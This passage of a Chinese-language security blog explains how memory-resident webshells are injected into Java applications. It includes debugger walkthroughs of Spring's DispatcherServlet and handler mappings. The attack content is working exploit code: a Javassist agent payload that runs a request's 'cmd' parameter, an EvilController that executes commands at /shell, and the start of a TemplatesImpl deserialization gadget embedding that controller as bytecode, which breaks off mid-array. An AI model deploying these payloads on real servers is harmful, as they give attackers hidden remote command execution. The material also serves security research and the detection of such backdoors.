class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getWriter().write(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getWriter().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getWriter().close();\n&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">                m.insertBefore(a);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                <span class="comment">// 将 c 从 classpool 中删除以释放内存</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用生成的payload打，以下是注入结果：</p><p><img src="https://pic.imgdb.cn/item/64d2702a1ddac507cc0afc5c.jpg" alt="image-20230804132524409"></p><p><img src="https://pic.imgdb.cn/item/64d270381ddac507cc0b22d0.jpg" alt="image-20230804132558767"></p><p>可以看到，上面提到的这种注入Java Agent内存马的方法仍然需要上传文件。不过，在rebeyond师傅的这篇文章<a href="https://xz.aliyun.com/t/11640">https://xz.aliyun.com/t/11640</a>介绍了通过Java AgentNoFile的方式植入内存马，整个过程中不会有文件在磁盘上落地，而且不会在JVM中新增类，甚至连方法也不会增加。膜一波！</p><h3 id="SpringMVC-Controller-内存马注入"><a href="#SpringMVC-Controller-内存马注入" class="headerlink" title="SpringMVC Controller 内存马注入"></a>SpringMVC Controller 内存马注入</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><h5 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h5><p>Spring容器就是ApplicationContext，它是一个接口，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。从ApplicationContext中可以根据Bean的ID获取Bean。</p><p>Spring还提供另一种IoC容器叫BeanFactory，使用方式和ApplicationContext类似</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XmlBeanFactory</span>(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;application.xml&quot;</span>));</span><br><span class="line"><span class="type">MailService</span> <span class="variable">mailService</span> <span class="operator">=</span> factory.getBean(MailService.class);</span><br></pre></td></tr></table></figure><p>BeanFactory和ApplicationContext的区别在于: BeanFactory的实现是按需创建，即第一次获取Bean时才创建这个Bean，而ApplicationContext会一次性创建所有的Bean。实际上ApplicationContext接口是从BeanFactory接口继承而来的。BeanFactory 接口是Spring IoC容器的实际代表者。</p><h5 id="ContextLoaderListener与DispatcherServlet"><a href="#ContextLoaderListener与DispatcherServlet" class="headerlink" title="ContextLoaderListener与DispatcherServlet"></a>ContextLoaderListener与DispatcherServlet</h5><p>一个典型Spring 应用的web.xml 配置示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns:xsi=<span class="string">&quot;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&quot;</span></span><br><span class="line">         xmlns=<span class="string">&quot;&lt;http://java.sun.com/xml/ns/javaee&gt;&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;&lt;http://java.sun.com/xml/ns/javaee&gt; &lt;http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&gt;&quot;</span></span><br><span class="line">         version=<span class="string">&quot;2.5&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;display-name&gt;HelloSpringMVC&lt;/display-name&gt;</span><br><span class="line">    &lt;listener&gt;</span><br><span class="line">        &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;</span><br><span class="line">    &lt;/listener&gt;</span><br><span class="line">    &lt;context-param&gt;</span><br><span class="line">        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;/WEB-INF/applicationContext.xml&lt;/param-value&gt;</span><br><span class="line">    &lt;/context-param&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">            &lt;param-value&gt;/WEB-INF/dispatcherServlet-servlet.xml&lt;/param-value&gt;</span><br><span class="line">        &lt;/init-param&gt;</span><br><span class="line">        &lt;load-on-startup&gt;<span class="number">1</span>&lt;/load-on-startup&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><ul><li><p>Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，其余都是Child Context。</p></li><li><p>所有Child Context都可以访问在Root Context中定义的bean，但是Root Context无法访问Child Context中定义的 bean。</p></li><li><p>所有的Context在创建后，会作为一个属性被添加到了ServletContext中。</p></li></ul><p><strong>ContextLoaderListener</strong> 主要被用来初始化全局唯一的Root Context，即Root WebApplicationContext。这个Root WebApplicationContext会和其他Child Context实例共享它的IoC容器，供其他Child Context获取并使用容器中的bean。</p><p>ContextLoaderListener本质上是一个监听器。Spring 实现了 Tomcat 提供的 ServletContextListener 接口，写了一个监听器来监听项目启动，一旦项目启动，会触发 ContextLoaderListener 中的特定方法 <strong>contextInitialized</strong></p><p>也就是说 Tomcat 的 ServletContext 创建时，会调用 ContextLoaderListener 的 contextInitialized()，这个方法内部的 initWebApplicationContext()就是用来初始化 Spring 的 IOC 容器的。</p><ol><li><p>ServletContext 对象是 Tomcat 的；</p></li><li><p>ServletContextListener 是 Tomcat 提供的接口；</p></li><li><p>ContextLoaderListener 是 Spring 写的，实现了 ServletContextListener；</p></li><li><p>Spring 自己写的监听器，用来创建 Spring IOC 容器；</p></li></ol><p>其相关配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;context-param&gt;</span><br><span class="line">    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;/WEB-INF/applicationContext.xml&lt;/param-value&gt;</span><br><span class="line">&lt;/context-param&gt;</span><br><span class="line"></span><br><span class="line">&lt;listener&gt;</span><br><span class="line">    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;</span><br><span class="line">&lt;/listener&gt;</span><br></pre></td></tr></table></figure><p><strong>DispatcherServlet</strong> 从本质上来讲是一个 Servlet（它继承自HttpServlet）。它的主要作用是处理传入的web请求，根据配置的URL pattern，将请求分发给正确的Controller和View。DispatcherServlet初始化完成后，会创建一个普通的Child Context实例。</p><p><strong>综上：</strong> 每个具体的DispatcherServlet创建的是一个Child Context，代表一个独立的IoC容器；而 ContextLoaderListener所创建的是一个Root Context，代表全局唯一的一个公共 IoC 容器。</p><p>如果要访问和操作bean，一般要获得当前代码执行环境的IoC 容器（Child Context）代表者ApplicationContext。</p><p>有以下几种办法获取代码运行时的上下文环境：</p><p><strong>第一种：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoaderListener.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure><p>getCurrentWebApplicationContext 获得的是 Root WebApplicationContext。但是请注意，打入内存马使用这种方式获取上下文环境时有一些限制，一种是目标不能是SpringBoot。我们刚刚看到ContextLoaderListener 如果要实现它应有的功能，是需要在 web.xml 中配置的。而 SpringBoot 中无论是以 main 方法还是 spring-boot:run 的方式执行都不跑 SpringBootServletInitializer 中的 onStartup， 导致 ContextLoaderListener 没有执行。因此通过这种办法获取到的context为null：</p><p><img src="https://pic.imgdb.cn/item/64d270451ddac507cc0b42ad.jpg" alt="image-20230808005326916"></p><p>还有一直限制就是有些Spring 应用逻辑比较简单的情况下，可能没有配置 ContextLoaderListener 、也没有类似 applicationContext.xml 的全局配置文件，只有简单的 servlet 配置文件，这时候通过这种方法也是获取不到Root WebApplicationContext的。</p><p><strong>第二种：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>使用这种方法可以获得一个名叫 dispatcherServlet-servlet 的 Child WebApplicationContext。</p><h4 id="流程分析-4"><a href="#流程分析-4" class="headerlink" title="流程分析"></a>流程分析</h4><p>先编写一个简单的Controller，之后在Controller类下断，然后访问配置的路由：</p><p><img src="https://pic.imgdb.cn/item/64d270581ddac507cc0b7287.jpg" alt="image-20230807221029340"></p><p>DispatcherServlet的主要作用是处理传入的web请求，根据配置的URL pattern，将请求分发给正确的Controller和View。我们可以看到我们的Web请求经过DispatcherServlet的doDispatch方法处理后被转发了过来：</p><p><img src="https://pic.imgdb.cn/item/64d270631ddac507cc0b8bf1.jpg" alt="image-20230807221156182"></p><p>对调用栈向上回溯看看DispatcherServlet是怎么做的分发：</p><p><img src="https://pic.imgdb.cn/item/64d2706e1ddac507cc0ba5f5.jpg" alt="image-20230807221313308"></p><p>通过调用HandlerAdapter类的handle方法对request和response对象进行处理，并且通过调用org.springframework.web.servlet.HandlerExecutionChain#getHandler方法获取了mappedHandler的handler字段。我们看一下mappedHandler是怎么来的：</p><p><img src="https://pic.imgdb.cn/item/64d270771ddac507cc0bbe88.jpg" alt="image-20230807223847138"></p><p>跟进<code>org.springframework.web.servlet.DispatcherServlet#getHandler</code>：</p><p><img src="https://pic.imgdb.cn/item/64d270891ddac507cc0be788.jpg" alt="image-20230807223913403"></p><p>可以发现mappedHandler是对handlerMappings遍历后调用getHandler()得到的，打下断点，跟进到了<code>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler</code>：</p><p><img src="https://pic.imgdb.cn/item/64d270991ddac507cc0c1114.jpg" alt="image-20230807224114663"></p><p>在此处又调用了相应HandlerMapping实现类的getHandlerInternal()方法：</p><p><img src="https://pic.imgdb.cn/item/64d270a61ddac507cc0c3088.jpg" alt="image-20230807224322836"></p><p>跟进后，发现又调用了父类的getHandlerInternal()方法，即`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal`：</p><p><img src="https://pic.imgdb.cn/item/64d270b01ddac507cc0c4718.jpg" alt="image-20230807224622982"></p><p>首先获取了我们设置的路由，之后对mappingRegistry进行上锁，最后解锁。在mappingRegistry中存储了路由信息：</p><p><img src="https://pic.imgdb.cn/item/64d270bf1ddac507cc0c6da6.jpg" alt="image-20230807224651916"></p><p>之后调用了org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#lookupHandlerMethod，我们跟进一下：</p><p><img src="https://pic.imgdb.cn/item/64d270c81ddac507cc0c837d.jpg" alt="image-20230807225613423"></p><p>可以看到，是从mappingRegistry中获取路由。那接下来我们需要做的就是在mappingRegistry中添加路由。在AbstractHandlerMethodMapping中就提供了registerMapping添加路由。</p><p><img src="https://pic.imgdb.cn/item/64d270d31ddac507cc0c9df0.jpg" alt="image-20230807231950009"></p><p>但是AbstractHandlerMethodMapping类为抽象类。不过我们可以从当前上下文环境中获得RequestMappingHandlerMapping的实例bean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure><h4 id="反序列化注入SpringBoot-Controller-内存马"><a href="#反序列化注入SpringBoot-Controller-内存马" class="headerlink" title="反序列化注入SpringBoot Controller 内存马"></a>反序列化注入SpringBoot Controller 内存马</h4><p>在给出EXP前，首先给大家提一个醒，springboot 2.6.x 以上版本对路由匹配方式进行了修改，以往的手动注册方式会导致任意请求提示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: </span><br><span class="line">Expected lookupPath in request attribute <span class="string">&quot;org.springframework.web.util.UrlPathHelper.PATH&quot;</span>.</span><br></pre></td></tr></table></figure><p>在网上找解决办法有三种，一种是降低版本，一种是修改默认映射策略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.mvc.pathmatch.matching-strategy=ANT_PATH_MATCHER</span><br></pre></td></tr></table></figure><p>还有一种方法：<a href="https://blog.csdn.net/maple_son/article/details/122572869">https://blog.csdn.net/maple_son&#x2F;article&#x2F;details&#x2F;122572869</a></p><p>因此如果我们直接利用网上给出的EXP来向SpringBoot中注入内存马，是打不成功的。此处给出我写好的EXP，根据注释应该可以看懂。先写一个恶意的Controller：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vul_demo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/shell&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">MemoryShell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后用test2方法生成上面Controller类的字节码，然后跟websocket反序列化类似，从当前线程中拿到ClassLoader，然后将这个恶意的Controller加载进JVM，并按照刚刚提的第三种方法自定义注册RequestMapping：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vul_demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.example.vul_demo.EvilController&quot;</span>;</span><br><span class="line">            <span class="comment">//加载com.example.vul_demo.EvilController类的字节码</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, -<span class="number">115</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">97</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">104</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">105</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">107</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">76</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">117</span>, <span class="number">108</span>, <span class="number">95</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">83</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span 